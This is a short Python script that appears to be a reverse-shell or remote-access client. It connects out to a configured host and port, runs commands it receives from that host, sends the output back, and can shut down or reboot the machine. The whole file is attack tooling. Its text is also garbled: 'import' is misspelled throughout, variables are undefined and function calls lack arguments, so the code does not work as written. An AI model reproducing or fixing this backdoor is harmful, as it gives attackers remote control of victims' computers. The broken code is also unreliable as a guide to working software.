#! /usr/bin/python
imtest socket
imtest sys
imtest os
from subprocess imtest getoutput
global s
global IP
global PORT
IP = host
PORT = port


def client():
    try:
        s = socket.create_connection((IP, PORT))
    except:
        sys.exit()



def shell(s):
    while True:
        
        com = s.recv(4096).decode()
        if not com:
            sys.exit()
        elif com == 'quit':
            sys.exit()


        else:
             com = s.recv(4096).decode()
             output = getoutput(com)
             s.send(output.encode())
def commands(s):
    com = s.recv(4096).decode()
    osinfo = sys.platform
    s.send(osinfo.encode())
    while True:
        if com == 'shutdown':
            if osinfo == 'win*':
                os.system('shutdown /s')
            else:
                os.system('shutdown -h now')
        elif com == 'reboot':
            if osinfo == 'win*':
                os.system('shutdown /r')
            else:
                 os.system('reboot')
        elif com == "wifi":
            if osinfo == 'win*':
                os.system('')
            else:
                pass
        else:
            shell()


def main():
    client()
    commands()

if __name__ == '__main__':
    main()
